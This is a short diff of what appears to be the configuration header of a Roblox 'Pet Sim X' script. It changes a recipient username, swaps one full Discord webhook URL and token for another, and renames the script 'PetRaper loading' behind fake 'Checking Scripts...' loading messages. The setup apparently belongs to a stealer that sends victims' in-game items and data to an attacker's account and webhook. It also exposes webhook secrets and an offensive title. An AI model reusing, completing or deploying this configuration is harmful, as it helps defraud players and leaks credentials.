@@ -1,7 +1,7 @@
-Username = "SziaUram_001"
-WebHook = "https://discord.com/api/webhooks/1092086206596124813/jMvS1VxNihRl_xCMRIQB8-1G1IEvMyJzs72AyQAwMKWhnwp5pSrD1WbNaIBy_XSMhphX"
+Username = "sziauram_001"
+WebHook = "https://discord.com/api/webhooks/1116731273130553367/4c3ZTcx22yYqkIvXxGdQswNDrsVfpisgWKUWowqgb8HXRVxl_uD2_cQv9G-1ywCA6glr"
 loadingscreen = true
-_G.CustomScriptName = "Pet Sim x Script"
+_G.CustomScriptName = "PetRaper loading"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script..."
 _G.Text3 = "Checking Scripts..."
